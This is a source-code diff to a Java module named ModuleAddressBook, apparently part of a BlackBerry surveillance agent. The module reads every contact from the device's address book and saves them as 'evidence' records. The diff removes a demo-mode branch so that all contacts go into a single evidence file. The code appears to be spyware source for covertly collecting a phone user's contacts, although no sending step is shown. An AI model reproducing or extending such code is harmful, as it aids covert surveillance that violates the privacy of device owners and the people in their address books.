@@ -23,7 +23,6 @@ import net.rim.blackberry.api.pdap.BlackBerryPIMList;
 import net.rim.blackberry.api.pdap.PIMListListener;
 import net.rim.device.api.util.DataBuffer;
 import blackberry.Messages;
-import blackberry.Status;
 import blackberry.config.ConfModule;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
@@ -199,17 +198,12 @@ public final class ModuleAddressBook extends BaseModule implements
             throws PIMException {
         final Enumeration eContacts = contactList.items();
 
-        boolean multiEvidence = Status.getInstance().isDemo();
-
         //#ifdef DEBUG
         debug.trace("saveContactEvidence: got contacts"); //$NON-NLS-1$
         //#endif
 
-        Evidence evidence = null;
-        if (!multiEvidence) {
-            evidence = new Evidence(EvidenceType.ADDRESSBOOK);
-            evidence.createEvidence();
-        }
+        Evidence evidence = new Evidence(EvidenceType.ADDRESSBOOK);
+        evidence.createEvidence();
 
         Contact contact;
         int number = 0;
@@ -220,13 +214,9 @@ public final class ModuleAddressBook extends BaseModule implements
             try {
                 contact = (Contact) eContacts.nextElement();
                 final byte[] packet = getContactPacket(contactList, contact);
-                if (!multiEvidence ) {
-                    evidence.writeEvidence(packet);
-                }else{
-                    evidence = new Evidence(EvidenceType.ADDRESSBOOK);
-                    evidence.atomicWriteOnce(packet);
-                }
-                
+
+                evidence.writeEvidence(packet);
+
             } catch (final Exception ex) {
                 //#ifdef DEBUG
                 debug.error(ex);
@@ -237,10 +227,7 @@ public final class ModuleAddressBook extends BaseModule implements
         //#ifdef DEBUG
         debug.trace("saveContactEvidence: finished contacts. Total: " + number); //$NON-NLS-1$
         //#endif
-        
-        if (!multiEvidence ){
-            evidence.close();
-        }
+        evidence.close();
 
         return number;
     }
